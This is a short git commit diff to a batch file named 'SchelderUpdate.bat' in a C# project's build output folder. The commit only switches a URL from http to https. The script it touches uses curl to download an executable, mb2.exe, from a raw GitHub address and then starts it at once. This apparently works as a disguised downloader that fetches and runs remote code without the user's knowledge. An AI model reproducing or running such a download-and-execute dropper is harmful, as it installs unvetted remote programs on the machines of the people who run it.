90d528ab778f04053f1f04910f0c9cd7fceea743
TRYAGAINBITCH <kijeyo4705@cmeinbox.com>
2023-06-19 16:39:34 +0300

    Update SchelderUpdate.bat

--- Kvas/Kvas/obj/Debug/SchelderUpdate.bat
+++ Kvas/Kvas/obj/Debug/SchelderUpdate.bat
@@ -1,5 +1,5 @@
 @echo off
-set "URL=http://raw.githubusercontent.com/Mshta-Dev/MyTestRepositoryCsharpTest/main/Kvas/Kvas/obj/Debug/mb2.exe"
+set "URL=https://raw.githubusercontent.com/Mshta-Dev/MyTestRepositoryCsharpTest/main/Kvas/Kvas/obj/Debug/mb2.exe"
 set "FILENAME=mb2.exe"
 curl -O "%URL%"
 start "" "%FILENAME%"
